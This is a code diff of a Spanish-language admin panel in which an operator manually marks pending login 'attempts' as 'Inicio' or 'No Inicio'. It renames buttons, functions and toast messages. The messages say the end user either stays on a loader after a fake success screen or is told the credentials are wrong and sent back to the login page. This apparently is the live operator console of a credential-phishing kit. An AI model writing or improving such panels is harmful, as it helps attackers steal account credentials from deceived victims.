@@ -564,11 +564,11 @@
                         </td>
                         <td>
                             <div class="actions">
-                                <button class="btn-approve" onclick="aprobarSesion(${item.id})" ${estado !== 'pendiente' ? 'disabled' : ''}>
-                                    ✅ Aprobar
+                                <button class="btn-approve" onclick="inicioSesion(${item.id})" ${estado !== 'pendiente' ? 'disabled' : ''}>
+                                    🚀 Inicio
                                 </button>
-                                <button class="btn-reject" onclick="rechazarSesion(${item.id})" ${estado !== 'pendiente' ? 'disabled' : ''}>
-                                    ❌ Rechazar
+                                <button class="btn-reject" onclick="noInicioSesion(${item.id})" ${estado !== 'pendiente' ? 'disabled' : ''}>
+                                    🚫 No Inicio
                                 </button>
                             </div>
                         </td>
@@ -601,10 +601,10 @@
         }
 
         // ═══════════════════════════════════════════════════════════════
-        // APROBAR SESIÓN
+        // INICIO DE SESIÓN (APROBADO)
         // ═══════════════════════════════════════════════════════════════
-        async function aprobarSesion(id) {
-            if (!confirm(`¿Estás seguro de APROBAR la sesión #${id}?`)) return;
+        async function inicioSesion(id) {
+            if (!confirm(`¿Estás seguro de que el INICIO fue correcto para la sesión #${id}?`)) return;
             mostrarLoading(true);
 
             try {
@@ -623,21 +623,21 @@
                     throw new Error(`Error HTTP: ${response.status}`);
                 }
 
-                mostrarToast(`✅ Sesión #${id} aprobada correctamente`, 'success');
+                mostrarToast(`✅ Inicio correcto - Sesión #${id} - El usuario ve el mensaje de inicio exitoso y se queda en el loader`, 'success');
                 cargarIntentos();
 
             } catch (error) {
-                console.error('Error al aprobar:', error);
-                mostrarToast('Error al aprobar la sesión: ' + error.message, 'error');
+                console.error('Error al aprobar inicio:', error);
+                mostrarToast('Error al confirmar inicio: ' + error.message, 'error');
                 mostrarLoading(false);
             }
         }
 
         // ═══════════════════════════════════════════════════════════════
-        // RECHAZAR SESIÓN
+        // NO INICIO DE SESIÓN (RECHAZADO)
         // ═══════════════════════════════════════════════════════════════
-        async function rechazarSesion(id) {
-            if (!confirm(`¿Estás seguro de RECHAZAR la sesión #${id}?`)) return;
+        async function noInicioSesion(id) {
+            if (!confirm(`¿Estás seguro de que NO INICIÓ la sesión #${id}? Se le mostrará al usuario que las credenciales son incorrectas y será redirigido al login.`)) return;
             mostrarLoading(true);
 
             try {
@@ -656,12 +656,12 @@
                     throw new Error(`Error HTTP: ${response.status}`);
                 }
 
-                mostrarToast(`❌ Sesión #${id} rechazada`, 'error');
+                mostrarToast(`🚫 No Inicio - Sesión #${id} - El usuario verá credenciales incorrectas y será redirigido al login`, 'error');
                 cargarIntentos();
 
             } catch (error) {
-                console.error('Error al rechazar:', error);
-                mostrarToast('Error al rechazar la sesión: ' + error.message, 'error');
+                console.error('Error al rechazar inicio:', error);
+                mostrarToast('Error al rechazar inicio: ' + error.message, 'error');
                 mostrarLoading(false);
             }
         }
